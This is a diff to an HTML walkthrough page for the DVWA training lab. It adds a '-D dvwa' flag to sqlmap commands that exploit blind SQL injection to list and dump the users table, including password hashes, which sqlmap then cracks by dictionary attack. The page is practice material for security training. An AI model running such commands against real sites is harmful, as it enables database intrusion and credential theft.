@@ -65,11 +65,11 @@ will automatically utilize Burp Suite as the proxy, allowing for seamless intera
 </ol></p>
 <h2>Enumerate the users table</h2>
 <p><ol>
- <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --columns -T users --batch</i></ul>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" -D dvwa --columns -T users --batch</i></ul>
  <ul>From the information found we conclude we are interested in the "user" and "password" columns</ul>
 </ol></p>
 <h2>Dump Usernames and Passwords</h2>
 <p><ol>
- <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --dump -T users --batch</i></ul>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --dump -D dvwa -T users --batch</i></ul>
 </ol></p>
 <p>SQLMap will retrieve the entries from the "user" and "password" columns. It will crack the hashes using a dictionary attack and outputs the plaintext passwords.</p>
